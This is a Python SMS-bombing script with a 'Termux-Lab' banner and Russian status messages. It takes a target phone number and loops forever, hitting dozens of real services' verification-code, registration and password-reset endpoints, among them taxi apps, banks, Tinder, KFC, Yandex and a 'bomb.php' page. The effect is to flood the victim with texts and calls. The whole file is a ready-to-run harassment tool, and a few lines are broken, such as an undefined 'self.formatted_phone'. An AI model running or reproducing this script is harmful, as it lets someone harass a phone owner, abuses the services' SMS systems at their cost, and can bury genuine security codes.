import requests, random, datetime, sys, time, argparse, os
os.system("clear")
banner = """\033[33m
   ▄▄█▀▀▀▀▀█▄▄
 ▄█▀  ▄▄     ▀█▄
 █   ███       █
 █   ██▄       █\033[37m  Termux-Lab\033[33m
 █    ▀██▄ ██  █\033[37m  Vk: @termux_lab\033[33m
 █      ▀███▀  █\033[37m  Tg: t.me/termuxlab\033[33m
 ▀█▄         ▄█▀
  ▄█   ▄▄▄▄█▀▀
  █  ▄█▀
  ▀▀▀▀
"""
print(banner + '\033[0m')
_phone = input('79xxxxxxxxx: ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
number = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		number += 1
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		print('\033[32m' + '[' + str(number) + '] Grab отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('\033[32m' + '[' + str(number) + '] RuTaxi отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print('\033[32m' + '[' + str(number) + '] BelkaCar отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('\033[32m' + '[' + str(number) + '] Tinder отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('\033[32m' + '[' + str(number) + '] Karusel отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print('\033[32m' + '[' + str(number) + '] Tinkoff отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('\033[32m' + '[' + str(number) + '] MTS отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Youla отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		print('\033[32m' + '[' + str(number) + '] PizzaHut отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		print('\033[32m' + '[' + str(number) + '] Rabota отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		print('\033[32m' + '[' + str(number) + '] Rutube отправлено!')
	except:
		number -= 1
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print('\033[32m' + '[' + str(number) + '] Citilink отправлено!')

	try:
		number += 1
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		print('\033[32m' + '[' + str(number) + '] Smsint отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] findclone звонок отправлен!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		print('\033[32m' + '[' + str(number) + '] oyorooms отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
		print('\033[32m' + '[' + str(number) + '] MVideo отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		print('\033[32m' + '[' + str(number) + '] newnext отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Sunlight отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		print('\033[32m' + '[' + str(number) + '] alpari отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Invitro отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print('\033[32m' + '[' + str(number) + '] Sberbank отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		print('\033[32m' + '[' + str(number) + '] Psbank отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Beltelcom отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Karusel отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] KFC отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		print('\033[32m' + '[' + str(number) + '] carsmile отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print('\033[32m' + '[' + str(number) + '] Citilink отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		print('\033[32m' + '[' + str(number) + '] Delitime отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] findclone звонок отправлен!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		print('\033[32m' + '[' + str(number) + '] Guru отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('\033[32m' + '[' + str(number) + '] ICQ отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print('\033[32m' + '[' + str(number) + '] InDriver отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print('\033[32m' + '[' + str(number) + '] Invitro отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] findclone звонок отправлен!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] Pmsm отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] IVI отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
		print('\033[32m' + '[' + str(number) + '] Lenta отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('\033[32m' + '[' + str(number) + '] Mail.ru отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
		print('\033[32m' + '[' + str(number) + '] MVideo отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('\033[32m' + '[' + str(number) + '] OK отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://plink.tech/register/',json={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] Plink отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] qlean отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
		print('\033[32m' + '[' + str(number) + '] SMSgorod отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] findclone звонок отправлен!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
		print('\033[32m' + '[' + str(number) + '] Tinder отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('\033[32m' + '[' + str(number) + '] Twitch отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
		print('\033[32m' + '[' + str(number) + '] CabWiFi отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
		print('\033[32m' + '[' + str(number) + '] wowworks отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print('\033[32m' + '[' + str(number) + '] Eda.Yandex отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[32m' + '[' + str(number) + '] Youla отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
		print('\033[32m' + '[' + str(number) + '] Alpari отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] SMS отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] не отправлено!')

	try:
		number += 1
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] Delivery отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] Findclone отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] apteka366 отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] Fex отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] ennergiia отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('http://greadios.beget.tech/bomb.php', data={"number": _phone})
		print('\033[32m' + '[' + str(number) + '] greadios отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] stoloto отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print('\033[32m' + '[' + str(number) + '] findclone звонок отправлен!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')

	try:
		number += 1
		requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
		print('\033[32m' + '[' + str(number) + '] gorzdrav отправлено!')
	except:
		number -= 1
		print('\033[35m' + '[-] Не отправлено!')



	try:
		iteration += 1
		print(('{}  Волна пройдена.').format(iteration))
	except:
		break
